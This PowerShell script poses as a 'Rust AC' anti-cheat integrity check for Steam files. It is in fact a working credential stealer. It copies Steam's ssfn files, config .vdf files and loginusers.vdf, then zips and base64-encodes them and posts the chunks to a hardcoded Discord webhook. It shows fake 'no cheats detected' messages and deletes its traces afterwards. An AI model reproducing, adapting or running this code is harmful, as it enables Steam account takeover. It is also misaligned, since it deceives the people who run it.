$webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
$zipPath = "$env:TEMP\rust_ac_check.zip"
$dataPath = "$env:TEMP\Rust_Scan_Results"

New-Item -Path $dataPath -ItemType Directory -Force | Out-Null

echo "Rust AC: Scanning Steam files for integrity verification..."

$steamPaths = "$env:ProgramFiles(x86)\Steam", "${env:ProgramFiles}\Steam"
$steamPath = $steamPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($steamPath) {
    $ssfnFiles = Get-ChildItem -Path $steamPath -Filter "ssfn*" -ErrorAction SilentlyContinue
    $configFiles = Get-ChildItem -Path "$steamPath\config" -Filter "*.vdf" -ErrorAction SilentlyContinue
    $loginUsersFile = Get-ChildItem -Path "$steamPath\config" -Filter "loginusers.vdf" -ErrorAction SilentlyContinue

    $allFiles = @($ssfnFiles) + @($configFiles) + @($loginUsersFile) | Where-Object { $_ -ne $null }
    foreach ($file in $allFiles) {
        Copy-Item -Path $file.FullName -Destination $dataPath -Force -ErrorAction SilentlyContinue
    }
    echo "Rust AC: Files collected for analysis."
}

if (Test-Path "$dataPath\*") {
    Compress-Archive -Path "$dataPath\*" -DestinationPath $zipPath -Force -ErrorAction SilentlyContinue
}

if (Test-Path $zipPath) {
    $zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $zipBase64 = [System.Convert]::ToBase64String($zipBytes)

    $chunkSize = 2000
    for ($i = 0; $i -lt $zipBase64.Length; $i += $chunkSize) {
        $remainingLength = $zipBase64.Length - $i
        $currentChunkSize = [Math]::Min($chunkSize, $remainingLength)
        $chunk = $zipBase64.Substring($i, $currentChunkSize)
        
        $payload = @{
            content = "```$chunk```"
        } | ConvertTo-Json -Compress

        try {
            $request = [System.Net.WebRequest]::Create($webhookUrl)
            $request.Method = "POST"
            $request.ContentType = "application/json"
            $request.UserAgent = "Rust-AC/3.7.1"
            $byteArray = [System.Text.Encoding]::UTF8.GetBytes($payload)
            $request.ContentLength = $byteArray.Length
            $dataStream = $request.GetRequestStream()
            $dataStream.Write($byteArray, 0, $byteArray.Length)
            $dataStream.Close()
            $response = $request.GetResponse()
            $response.Close()
        } catch {}
    }
}

echo "Rust AC: Scan completed successfully. No cheats detected."
Start-Sleep -Seconds 2

Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
Remove-Item -Path $dataPath -Recurse -Force -ErrorAction SilentlyContinue
